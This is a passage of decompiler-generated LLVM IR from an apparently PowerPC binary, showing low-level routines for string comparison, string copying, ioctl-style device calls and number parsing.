  store i32 34, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10007300

dec_label_pc_10007300:                            ; preds = %dec_label_pc_100072d0, %dec_label_pc_100072f8
  %v0_10007310 = phi i32 [ %v1_100072f0, %dec_label_pc_100072f8 ], [ %v1_100072ec, %dec_label_pc_100072d0 ]
  %v3_10007300 = icmp eq i32 %v0_10007310, 0
  br i1 %v3_10007300, label %dec_label_pc_10007324, label %dec_label_pc_10007308

dec_label_pc_10007308:                            ; preds = %dec_label_pc_10007300
  %v0_10007308 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10007308, i32* @r4, align 4
  %v0_1000730c = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1000730c, i32* @r3, align 4
  store i32 %v0_10007310, i32* @r5, align 4
  store i32 268464920, i32* @lr, align 4
  %v0_10007314 = call i32 @function_10006d88()
  %v1_10007318 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007318 = add i32 %v1_10007318, %v0_1000730c
  %v3_10007320 = add i32 %v2_10007318, -1
  %v4_10007320 = inttoptr i32 %v3_10007320 to i8*
  store i8 0, i8* %v4_10007320, align 1
  br label %dec_label_pc_10007324

dec_label_pc_10007324:                            ; preds = %dec_label_pc_10007300, %dec_label_pc_10007308
  %v0_10007324 = load i32, i32* %r28.global-to-local, align 4
  %v3_10007324 = icmp eq i32 %v0_10007324, 0
  br i1 %v3_10007324, label %dec_label_pc_10007334, label %dec_label_pc_1000732c

dec_label_pc_1000732c:                            ; preds = %dec_label_pc_10007324
  %v0_1000732c = call i32 @function_10004b48()
  %v0_10007330 = load i32, i32* %r28.global-to-local, align 4
  %v2_10007330 = inttoptr i32 %v0_1000732c to i32*
  store i32 %v0_10007330, i32* %v2_10007330, align 4
  %v0_10007338.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10007334

dec_label_pc_10007334:                            ; preds = %dec_label_pc_10007324, %dec_label_pc_1000732c
  %v0_10007338 = phi i32 [ 0, %dec_label_pc_10007324 ], [ %v0_10007338.pre, %dec_label_pc_1000732c ]
  ret i32 %v0_10007338

; uselistorder directives
  uselistorder i32 %v2_100072dc, { 1, 0 }
  uselistorder i32 %v4_100072d0, { 1, 0 }
  uselistorder i32 %v1_100072d8, { 1, 2, 0 }
  uselistorder i32 %v1_10007274, { 1, 0 }
  uselistorder i32 %v0_10007248, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r28.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1000e114.245 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007334, { 1, 0 }
  uselistorder label %dec_label_pc_10007324, { 1, 0 }
  uselistorder label %dec_label_pc_10007300, { 1, 0 }
  uselistorder label %dec_label_pc_100072d0, { 1, 0 }
  uselistorder label %dec_label_pc_10007270, { 1, 0 }
}

define i32 @function_1000734c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000734c:
  %v2_10007358 = call i32 @function_1000a3ec(i32 %arg2, i32 %arg1)
  ret i32 %v2_10007358
}

define i32 @function_1000735c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000735c:
  %v3_10007360 = load i32, i32* bitcast (i32** @global_var_10010454.247 to i32*), align 4
  %v0_10007368.pre = load i32, i32* @r3, align 4
  %v1_10007368.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10007368

dec_label_pc_10007368:                            ; preds = %dec_label_pc_10007390, %dec_label_pc_1000735c
  %v0_100073a46 = phi i32 [ %v0_100073a47, %dec_label_pc_10007390 ], [ 0, %dec_label_pc_1000735c ]
  %v0_10007394 = phi i32 [ %v1_10007394, %dec_label_pc_10007390 ], [ %v1_10007368.pre, %dec_label_pc_1000735c ]
  %v0_10007398 = phi i32 [ %v1_10007398, %dec_label_pc_10007390 ], [ %v0_10007368.pre, %dec_label_pc_1000735c ]
  %v4_10007368 = icmp eq i32 %v0_10007398, %v0_10007394
  %.pre = inttoptr i32 %v0_10007398 to i8*
  br i1 %v4_10007368, label %dec_label_pc_10007390, label %dec_label_pc_10007370

dec_label_pc_10007370:                            ; preds = %dec_label_pc_10007368
  %v2_10007370 = load i8, i8* %.pre, align 1
  %v3_10007370 = zext i8 %v2_10007370 to i32
  %v1_10007374 = inttoptr i32 %v0_10007394 to i8*
  %v2_10007374 = load i8, i8* %v1_10007374, align 1
  %v3_10007374 = zext i8 %v2_10007374 to i32
  %v1_10007378 = mul nuw nsw i32 %v3_10007370, 2
  %v1_1000737c = mul nuw nsw i32 %v3_10007374, 2
  %v2_10007380 = add i32 %v1_10007378, %v3_10007360
  %v3_10007380 = inttoptr i32 %v2_10007380 to i16*
  %v4_10007380 = load i16, i16* %v3_10007380, align 2
  %v5_10007380 = sext i16 %v4_10007380 to i32
  %v2_10007384 = add i32 %v1_1000737c, %v3_10007360
  %v3_10007384 = inttoptr i32 %v2_10007384 to i16*
  %v4_10007384 = load i16, i16* %v3_10007384, align 2
  %v5_10007384 = sext i16 %v4_10007384 to i32
  %v2_10007388 = sub nsw i32 %v5_10007380, %v5_10007384
  %v4_1000738c = icmp eq i16 %v4_10007380, %v4_10007384
  br i1 %v4_1000738c, label %dec_label_pc_10007390, label %dec_label_pc_100073a4

dec_label_pc_10007390:                            ; preds = %dec_label_pc_10007368, %dec_label_pc_10007370
  %v0_100073a47 = phi i32 [ %v2_10007388, %dec_label_pc_10007370 ], [ %v0_100073a46, %dec_label_pc_10007368 ]
  %v2_10007390 = load i8, i8* %.pre, align 1
  %v1_10007394 = add i32 %v0_10007394, 1
  %v1_10007398 = add i32 %v0_10007398, 1
  %v3_1000739c = icmp eq i8 %v2_10007390, 0
  br i1 %v3_1000739c, label %dec_label_pc_100073a4, label %dec_label_pc_10007368

dec_label_pc_100073a4:                            ; preds = %dec_label_pc_10007390, %dec_label_pc_10007370
  %v0_100073a4 = phi i32 [ %v0_100073a47, %dec_label_pc_10007390 ], [ %v2_10007388, %dec_label_pc_10007370 ]
  ret i32 %v0_100073a4

; uselistorder directives
  uselistorder i32 %v2_10007388, { 1, 0 }
  uselistorder i32 %v0_10007398, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007390, { 1, 0 }
}

define i32 @function_100073ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_100073ac:
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  %v0_100073c0 = call i32 @function_10006ed4()
  %v1_100073c4 = add i32 %v0_100073c0, 1
  store i32 %v1_100073c4, i32* @r29, align 4
  store i32 268465104, i32* @lr, align 4
  %v1_100073cc = call i32 @function_10007cec(i32 %v1_100073c4)
  store i32 %v1_100073cc, i32* @r3, align 4
  %v0_100073d0 = load i32, i32* @r28, align 4
  store i32 %v0_100073d0, i32* @r4, align 4
  store i32 %v1_100073cc, i32* @r31, align 4
  %v3_100073d4 = icmp eq i32 %v1_100073cc, 0
  %v0_100073d8 = load i32, i32* @r29, align 4
  store i32 %v0_100073d8, i32* @r5, align 4
  br i1 %v3_100073d4, label %dec_label_pc_100073e4, label %dec_label_pc_100073e0

dec_label_pc_100073e0:                            ; preds = %dec_label_pc_100073ac
  store i32 268465124, i32* @lr, align 4
  %v0_100073e0 = call i32 @function_10006d88()
  %v0_100073e8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100073e4

dec_label_pc_100073e4:                            ; preds = %dec_label_pc_100073ac, %dec_label_pc_100073e0
  %v0_100073e8 = phi i32 [ 0, %dec_label_pc_100073ac ], [ %v0_100073e8.pre, %dec_label_pc_100073e0 ]
  ret i32 %v0_100073e8

; uselistorder directives
  uselistorder label %dec_label_pc_100073e4, { 1, 0 }
}

define i32 @function_100073fc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100073fc:
  store i32 ptrtoint (i32* @global_var_1001049c.248 to i32), i32* @r5, align 4
  %v1_10007404 = call i32 @function_1000a6c0(i32 ptrtoint (i32* @global_var_1001049c.248 to i32))
  ret i32 %v1_10007404
}

define i32 @function_10007408(i32 %arg1) local_unnamed_addr {
dec_label_pc_10007408:
  %stack_var_-72 = alloca i32, align 4
  store i32 268465180, i32* @lr, align 4
  %v2_10007418 = call i32 @function_10007434(i32* nonnull %stack_var_-72)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32*)* @function_10007434, { 1, 0 }
}

define i32 @function_10007434(i32* %arg1) local_unnamed_addr {
dec_label_pc_10007434:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_2()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10007438 = load i32, i32* @lr, align 4
  store i32 %v0_10007438, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10007448 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268465244, i32* @lr, align 4
  %v3_10007458 = call i32 @function_100047f8(i32 1076655123, i32 %v2_10007448, i32 %v2_10007448)
  %v2_1000745c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000745c, i32* @r4, align 4
  store i32 %v3_10007458, i32* @r30, align 4
  %v3_10007460 = icmp eq i32 %v3_10007458, 0
  store i32 19, i32* @r5, align 4
  %v0_10007468 = load i32, i32* @r31, align 4
  br i1 %v3_10007460, label %dec_label_pc_10007470, label %dec_label_pc_100074b8

dec_label_pc_10007470:                            ; preds = %dec_label_pc_10007434
  %v1_10007468 = add i32 %v0_10007468, 17
  %v3_10007488 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10007488, i32* %r0.global-to-local, align 4
  %v2_1000748c = add i32 %v0_10007468, 4
  %v3_1000748c = inttoptr i32 %v2_1000748c to i32*
  store i32 %tmp7, i32* %v3_1000748c, align 4
  %v0_10007490 = load i32, i32* %r11.global-to-local, align 4
  %v1_10007490 = load i32, i32* @r31, align 4
  %v2_10007490 = add i32 %v1_10007490, 8
  %v3_10007490 = inttoptr i32 %v2_10007490 to i32*
  store i32 %v0_10007490, i32* %v3_10007490, align 4
  %v0_10007494 = load i32, i32* %r0.global-to-local, align 4
  %v1_10007494 = load i32, i32* @r31, align 4
  %v2_10007494 = inttoptr i32 %v1_10007494 to i32*
  store i32 %v0_10007494, i32* %v2_10007494, align 4
  %v0_10007498 = load i32, i32* %r10.global-to-local, align 4
  %v1_10007498 = load i32, i32* @r31, align 4
  %v2_10007498 = add i32 %v1_10007498, 12
  %v3_10007498 = inttoptr i32 %v2_10007498 to i32*
  store i32 %v0_10007498, i32* %v3_10007498, align 4
  %v3_1000749c = load i32, i32* @r31, align 4
  %v4_1000749c = add i32 %v3_1000749c, 16
  %v5_1000749c = inttoptr i32 %v4_1000749c to i8*
  store i8 %tmp4, i8* %v5_1000749c, align 1
  %v1_100074a0 = load i32, i32* @r31, align 4
  %v2_100074a0 = add i32 %v1_100074a0, 52
  %v3_100074a0 = inttoptr i32 %v2_100074a0 to i32*
  store i32 %tmp3, i32* %v3_100074a0, align 4
  %v1_100074a4 = load i32, i32* @r31, align 4
  %v2_100074a4 = add i32 %v1_100074a4, 56
  %v3_100074a4 = inttoptr i32 %v2_100074a4 to i32*
  store i32 %tmp2, i32* %v3_100074a4, align 4
  store i32 268465324, i32* @lr, align 4
  %v6_100074a8 = sext i8 %tmp4 to i32
  %v8_100074a8 = call i32 @function_1000a598(i32 %v1_10007468, i32 %v2_1000745c, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_100074a8, i32 %tmp7)
  store i32 268465336, i32* @lr, align 4
  %v3_100074b4 = call i32 @function_10006e24(i32 %v8_100074a8, i32 0, i32 13)
  %v0_100074bc.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100074b8

dec_label_pc_100074b8:                            ; preds = %dec_label_pc_10007434, %dec_label_pc_10007470
  %v0_100074bc = phi i32 [ %v3_10007458, %dec_label_pc_10007434 ], [ %v0_100074bc.pre, %dec_label_pc_10007470 ]
  store i32 %v0_10007438, i32* %r0.global-to-local, align 4
  ret i32 %v0_100074bc

; uselistorder directives
  uselistorder i32 %v2_10007448, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32 13, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_100074b8, { 1, 0 }
}

define i32 @function_100074d0() local_unnamed_addr {
dec_label_pc_100074d0:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_100074d8 = load i32, i32* @r4, align 4
  %v3_100074d8 = icmp eq i32 %v0_100074d8, 1
  %v0_100074e0 = load i32, i32* @r3, align 4
  store i32 %v0_100074e0, i32* @r27, align 4
  %v0_100074e8 = load i32, i32* @r5, align 4
  store i32 %v0_100074e8, i32* @r31, align 4
  br i1 %v3_100074d8, label %dec_label_pc_1000750c, label %dec_label_pc_100074f0

dec_label_pc_100074f0:                            ; preds = %dec_label_pc_100074d0
  %v3_100074f0 = icmp eq i32 %v0_100074d8, 2
  br i1 %v3_100074f0, label %dec_label_pc_1000752c, label %dec_label_pc_100074f8

dec_label_pc_100074f8:                            ; preds = %dec_label_pc_100074f0
  %v3_100074f8 = icmp eq i32 %v0_100074d8, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_100074f8, label %dec_label_pc_10007534, label %dec_label_pc_10007518

dec_label_pc_1000750c:                            ; preds = %dec_label_pc_100074d0
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_10007534

dec_label_pc_10007518:                            ; preds = %dec_label_pc_100074f8
  %v0_10007518 = call i32 @function_10004b48()
  store i32 -1, i32* @r28, align 4
  %v2_10007524 = inttoptr i32 %v0_10007518 to i32*
  store i32 22, i32* %v2_10007524, align 4
  br label %dec_label_pc_1000761c

dec_label_pc_1000752c:                            ; preds = %dec_label_pc_100074f0
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_10007534

dec_label_pc_10007534:                            ; preds = %dec_label_pc_100074f8, %dec_label_pc_1000750c, %dec_label_pc_1000752c
  %v1_10007534 = inttoptr i32 %v0_100074e8 to i32*
  %v2_10007534 = load i32, i32* %v1_10007534, align 4
  store i32 19, i32* @r5, align 4
  %v1_1000753c = add i32 %v0_100074e8, 4
  %v2_1000753c = inttoptr i32 %v1_1000753c to i32*
  %v3_1000753c = load i32, i32* %v2_1000753c, align 4
  store i32 %v3_1000753c, i32* %r9.global-to-local, align 4
  %v1_10007540 = add i32 %v0_100074e8, 17
  store i32 %v1_10007540, i32* @r4, align 4
  %v1_10007544 = add i32 %v0_100074e8, 8
  %v2_10007544 = inttoptr i32 %v1_10007544 to i32*
  %v3_10007544 = load i32, i32* %v2_10007544, align 4
  %v2_10007548 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10007548, i32* @r3, align 4
  %v2_10007550 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_10007550, i32* @r26, align 4
  store i32 %v2_10007534, i32* %stack_var_-72, align 4
  store i32 268465536, i32* @lr, align 4
  %v0_1000757c = call i32 @function_10006d88()
  %v0_10007580 = load i32, i32* @r27, align 4
  %v0_10007584 = load i32, i32* @r30, align 4
  store i32 268465556, i32* @lr, align 4
  %v3_10007590 = call i32 @function_100047f8(i32 %v0_10007580, i32 %v0_10007584, i32 %v2_10007550)
  store i32 %v3_10007590, i32* @r28, align 4
  %v3_10007594 = icmp eq i32 %v3_10007590, 0
  br i1 %v3_10007594, label %dec_label_pc_1000759c, label %dec_label_pc_1000761c

dec_label_pc_1000759c:                            ; preds = %dec_label_pc_10007534
  %v0_1000759c = load i32, i32* @r30, align 4
  %v3_100075a0 = icmp eq i32 %v0_1000759c, -2144570348
  br i1 %v3_100075a0, label %dec_label_pc_100075a8, label %dec_label_pc_10007618

dec_label_pc_100075a8:                            ; preds = %dec_label_pc_1000759c
  %v0_100075a8 = call i32 @function_10004b48()
  store i32 %v0_100075a8, i32* @r29, align 4
  %v0_100075b8 = load i32, i32* @r27, align 4
  %v1_100075c0 = inttoptr i32 %v0_100075a8 to i32*
  %v2_100075c0 = load i32, i32* %v1_100075c0, align 4
  store i32 %v2_100075c0, i32* @r30, align 4
  store i32 268465612, i32* @lr, align 4
  %v3_100075c8 = call i32 @function_100047f8(i32 %v0_100075b8, i32 1076655123, i32 %v2_10007550)
  %v3_100075cc = icmp eq i32 %v3_100075c8, 0
  br i1 %v3_100075cc, label %dec_label_pc_100075dc, label %dec_label_pc_100075d4

dec_label_pc_100075d4:                            ; preds = %dec_label_pc_100075a8
  %v0_100075d4 = load i32, i32* @r30, align 4
  %v1_100075d4 = load i32, i32* @r29, align 4
  %v2_100075d4 = inttoptr i32 %v1_100075d4 to i32*
  store i32 %v0_100075d4, i32* %v2_100075d4, align 4
  br label %dec_label_pc_1000761c

dec_label_pc_100075dc:                            ; preds = %dec_label_pc_100075a8
  %v0_100075dc = load i32, i32* @r31, align 4
  %v1_100075dc = add i32 %v0_100075dc, 8
  %v2_100075dc = inttoptr i32 %v1_100075dc to i32*
  %v3_100075dc = load i32, i32* %v2_100075dc, align 4
  %v1_100075e4 = call i32 @__asm_rlwinm(i32 %v3_100075dc, i32 0, i32 19, i32 20)
  %v1_100075e8 = call i32 @__asm_rlwinm(i32 %v3_10007544, i32 0, i32 19, i32 20)
  store i32 %v1_100075e8, i32* %r9.global-to-local, align 4
  %v4_100075ec = icmp eq i32 %v1_100075e4, %v1_100075e8
  br i1 %v4_100075ec, label %dec_label_pc_100075f4, label %dec_label_pc_10007608

dec_label_pc_100075f4:                            ; preds = %dec_label_pc_100075dc
  %v1_100075f4 = and i32 %v3_100075dc, 768
  store i32 %v1_100075f4, i32* %r9.global-to-local, align 4
  %v3_100075f4 = icmp eq i32 %v1_100075f4, 0
  br i1 %v3_100075f4, label %dec_label_pc_10007618, label %dec_label_pc_100075fc

dec_label_pc_100075fc:                            ; preds = %dec_label_pc_100075f4
  %v1_100075fc = call i32 @__asm_rlwinm(i32 %v3_10007544, i32 0, i32 22, i32 23)
  %v0_10007600 = load i32, i32* %r9.global-to-local, align 4
  %v4_10007600 = icmp eq i32 %v0_10007600, %v1_100075fc
  br i1 %v4_10007600, label %dec_label_pc_10007618, label %dec_label_pc_10007608

dec_label_pc_10007608:                            ; preds = %dec_label_pc_100075dc, %dec_label_pc_100075fc
  store i32 -1, i32* @r28, align 4
  %v1_10007610 = load i32, i32* @r29, align 4
  %v2_10007610 = inttoptr i32 %v1_10007610 to i32*
  store i32 22, i32* %v2_10007610, align 4
  br label %dec_label_pc_1000761c

dec_label_pc_10007618:                            ; preds = %dec_label_pc_1000759c, %dec_label_pc_100075fc, %dec_label_pc_100075f4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000761c

dec_label_pc_1000761c:                            ; preds = %dec_label_pc_10007534, %dec_label_pc_100075d4, %dec_label_pc_10007518, %dec_label_pc_10007608, %dec_label_pc_10007618
  %v0_10007620 = load i32, i32* @r28, align 4
  ret i32 %v0_10007620

; uselistorder directives
  uselistorder i32 %v0_100074e8, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r9.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @function_100047f8, { 2, 1, 0, 3 }
  uselistorder i32 19, { 3, 4, 5, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_1000761c, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10007618, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10007608, { 1, 0 }
  uselistorder label %dec_label_pc_10007534, { 2, 1, 0 }
}

define i32 @function_10007634(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10007634:
  %v0_10007634 = load i32, i32* @r3, align 4
  ret i32 %v0_10007634
}

define i32 @function_10007640(i32 %arg1) local_unnamed_addr {
dec_label_pc_10007640:
  %v0_10007640 = load i32, i32* @r3, align 4
  ret i32 %v0_10007640
}

define i32 @function_10007644(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10007644:
  %cr1_eq.global-to-local = alloca i1, align 1
  %cr6_eq.global-to-local = alloca i1, align 1
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 0, i32* %r12.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_10007658.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10007658

dec_label_pc_10007658:                            ; preds = %dec_label_pc_10007748, %dec_label_pc_10007644
  %v0_1000766c = phi i32 [ %v1_10007748, %dec_label_pc_10007748 ], [ %v0_10007658.pre, %dec_label_pc_10007644 ]
  %v1_10007658 = inttoptr i32 %v0_1000766c to i8*
  %v2_10007658 = load i8, i8* %v1_10007658, align 1
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 10, i32* %r7.global-to-local, align 4
  %v3_10007664 = icmp eq i8 %v2_10007658, 48
  br i1 %v3_10007664, label %dec_label_pc_1000766c, label %dec_label_pc_10007694

dec_label_pc_1000766c:                            ; preds = %dec_label_pc_10007658
  %v1_1000766c = add i32 %v0_1000766c, 1
  %v2_1000766c = inttoptr i32 %v1_1000766c to i8*
  %v3_1000766c = load i8, i8* %v2_1000766c, align 1
  store i32 %v1_1000766c, i32* @r3, align 4
  %v3_10007670 = icmp eq i8 %v3_1000766c, 120
  br i1 %v3_10007670, label %dec_label_pc_10007688, label %dec_label_pc_10007678

dec_label_pc_10007678:                            ; preds = %dec_label_pc_1000766c
  %v3_10007678 = icmp eq i8 %v3_1000766c, 88
  store i32 1, i32* %r6.global-to-local, align 4
  store i32 8, i32* %r7.global-to-local, align 4
  br i1 %v3_10007678, label %dec_label_pc_10007688, label %dec_label_pc_10007694

dec_label_pc_10007688:                            ; preds = %dec_label_pc_10007678, %dec_label_pc_1000766c
  %v1_10007688 = add i32 %v0_1000766c, 2
  store i32 %v1_10007688, i32* @r3, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 16, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10007694

dec_label_pc_10007694:                            ; preds = %dec_label_pc_10007678, %dec_label_pc_10007658, %dec_label_pc_10007688
  %v0_100077045 = phi i32 [ %v1_1000766c, %dec_label_pc_10007678 ], [ %v0_1000766c, %dec_label_pc_10007658 ], [ %v1_10007688, %dec_label_pc_10007688 ]
  %v0_1000771c10 = phi i32 [ 1, %dec_label_pc_10007678 ], [ 0, %dec_label_pc_10007658 ], [ 0, %dec_label_pc_10007688 ]
  %v0_10007698 = phi i32 [ 8, %dec_label_pc_10007678 ], [ 10, %dec_label_pc_10007658 ], [ 16, %dec_label_pc_10007688 ]
  %v3_10007694 = load i32, i32* @global_var_1001044c, align 4
  store i32 %v3_10007694, i32* %r31.global-to-local, align 4
  %v3_10007698 = icmp eq i32 %v0_10007698, 8
  store i1 %v3_10007698, i1* %cr1_eq.global-to-local, align 1
  %v3_1000769c = icmp eq i32 %v0_10007698, 16
  store i1 %v3_1000769c, i1* %cr6_eq.global-to-local, align 1
  store i32 0, i32* %r10.global-to-local, align 4
  %v1_1000770418 = inttoptr i32 %v0_100077045 to i8*
  %v2_1000770419 = load i8, i8* %v1_1000770418, align 1
  %v3_1000770420 = zext i8 %v2_1000770419 to i32
  store i32 %v3_1000770420, i32* %r11.global-to-local, align 4
  %v3_1000770c22 = icmp eq i8 %v2_1000770419, 0
  store i32 %v3_1000770420, i32* %r5.global-to-local, align 4
  br i1 %v3_1000770c22, label %dec_label_pc_1000771c, label %dec_label_pc_100076a8

dec_label_pc_100076a8:                            ; preds = %dec_label_pc_10007694, %dec_label_pc_100076f4.dec_label_pc_10007704_crit_edge.dec_label_pc_100076a8_crit_edge
  %v1_100076a8 = phi i32 [ %v1_100076a8.pre, %dec_label_pc_100076f4.dec_label_pc_10007704_crit_edge.dec_label_pc_100076a8_crit_edge ], [ %v3_10007694, %dec_label_pc_10007694 ]
  %v1_1000771026.in = phi i32 [ %v3_10007704, %dec_label_pc_100076f4.dec_label_pc_10007704_crit_edge.dec_label_pc_100076a8_crit_edge ], [ %v3_1000770420, %dec_label_pc_10007694 ]
  %v0_100076ac25 = phi i32 [ %v0_100076f4, %dec_label_pc_100076f4.dec_label_pc_10007704_crit_edge.dec_label_pc_100076a8_crit_edge ], [ 0, %dec_label_pc_10007694 ]
  %v1_1000771026 = mul nuw nsw i32 %v1_1000771026.in, 2
  %v2_100076a8 = add i32 %v1_100076a8, %v1_1000771026
  %v3_100076a8 = inttoptr i32 %v2_100076a8 to i16*
  %v4_100076a8 = load i16, i16* %v3_100076a8, align 2
  %v5_100076a8 = zext i16 %v4_100076a8 to i32
  %v1_100076ac = mul i32 %v0_100076ac25, 16
  store i32 %v1_100076ac, i32* %r8.global-to-local, align 4
  %v1_100076b0 = call i32 @__asm_rlwinm(i32 %v5_100076a8, i32 31, i32 31, i32 31)
  %v1_100076b4 = and i32 %v5_100076a8, 8
  %v3_100076b4 = icmp eq i32 %v1_100076b4, 0
  %not.v2_100076b8 = icmp eq i32 %v1_100076b0, 0
  %v6_100076bc = sext i1 %not.v2_100076b8 to i32
  %v1_100076c0 = call i32 @__asm_rlwinm(i32 %v6_100076bc, i32 0, i32 26, i32 26)
  %v1_100076c4 = call i32 @__asm_rlwinm(i32 %v5_100076a8, i32 28, i32 31, i32 31)
  %v1_100076c8 = add i32 %v1_100076c0, -87
  br i1 %v3_100076b4, label %dec_label_pc_100076e8, label %dec_label_pc_100076d4

dec_label_pc_100076d4:                            ; preds = %dec_label_pc_100076a8
  %v0_100076d4 = load i32, i32* %r11.global-to-local, align 4
  %v2_100076d4 = icmp ugt i32 %v0_100076d4, 55
  %v0_100076d8 = load i32, i32* %r5.global-to-local, align 4
  %v1_100076d8 = add i32 %v0_100076d8, -48
  store i32 %v1_100076d8, i32* %r10.global-to-local, align 4
  %v0_100076dc = load i1, i1* %cr1_eq.global-to-local, align 1
  %brmerge13.demorgan = and i1 %v2_100076d4, %v0_100076dc
  br i1 %brmerge13.demorgan, label %dec_label_pc_10007758, label %dec_label_pc_100076f4

dec_label_pc_100076e8:                            ; preds = %dec_label_pc_100076a8
  %v3_100076cc = icmp eq i32 %v1_100076c4, 0
  %v0_100076e8 = load i1, i1* %cr6_eq.global-to-local, align 1
  %v0_100076e8.not = xor i1 %v0_100076e8, true
  %brmerge = or i1 %v3_100076cc, %v0_100076e8.not
  br i1 %brmerge, label %dec_label_pc_100076e8.dec_label_pc_1000771c_crit_edge, label %dec_label_pc_100076f0

dec_label_pc_100076e8.dec_label_pc_1000771c_crit_edge: ; preds = %dec_label_pc_100076e8
  %v0_1000771c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000771c

dec_label_pc_100076f0:                            ; preds = %dec_label_pc_100076e8
  %v0_100076f0 = load i32, i32* %r8.global-to-local, align 4
  %v2_100076f0 = add i32 %v0_100076f0, %v1_100076c8
  store i32 %v2_100076f0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_100076f4

dec_label_pc_100076f4:                            ; preds = %dec_label_pc_100076d4, %dec_label_pc_100076f0
  %v0_100076f4 = phi i32 [ %v1_100076d8, %dec_label_pc_100076d4 ], [ %v2_100076f0, %dec_label_pc_100076f0 ]
  %v2_100076f4 = icmp ugt i32 %v0_100076f4, 255
  %v0_100076f8 = load i32, i32* @r3, align 4
  %v1_100076f8 = add i32 %v0_100076f8, 1
  store i32 %v1_100076f8, i32* @r3, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  br i1 %v2_100076f4, label %dec_label_pc_10007758, label %dec_label_pc_100076f4.dec_label_pc_10007704_crit_edge

dec_label_pc_100076f4.dec_label_pc_10007704_crit_edge: ; preds = %dec_label_pc_100076f4
  %v1_10007708.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_10007704 = inttoptr i32 %v1_100076f8 to i8*
  %v2_10007704 = load i8, i8* %v1_10007704, align 1
  %v3_10007704 = zext i8 %v2_10007704 to i32
  store i32 %v3_10007704, i32* %r11.global-to-local, align 4
  %v2_10007708 = mul i32 %v0_100076f4, %v1_10007708.pre
  %v3_1000770c = icmp eq i8 %v2_10007704, 0
  %v2_10007714 = add i32 %v3_10007704, %v2_10007708
  store i32 %v2_10007714, i32* %r5.global-to-local, align 4
  br i1 %v3_1000770c, label %dec_label_pc_1000771c.thread, label %dec_label_pc_100076f4.dec_label_pc_10007704_crit_edge.dec_label_pc_100076a8_crit_edge

dec_label_pc_1000771c.thread:                     ; preds = %dec_label_pc_100076f4.dec_label_pc_10007704_crit_edge
  br label %dec_label_pc_10007724

dec_label_pc_100076f4.dec_label_pc_10007704_crit_edge.dec_label_pc_100076a8_crit_edge: ; preds = %dec_label_pc_100076f4.dec_label_pc_10007704_crit_edge
  %v1_100076a8.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100076a8

dec_label_pc_1000771c:                            ; preds = %dec_label_pc_10007694, %dec_label_pc_100076e8.dec_label_pc_1000771c_crit_edge
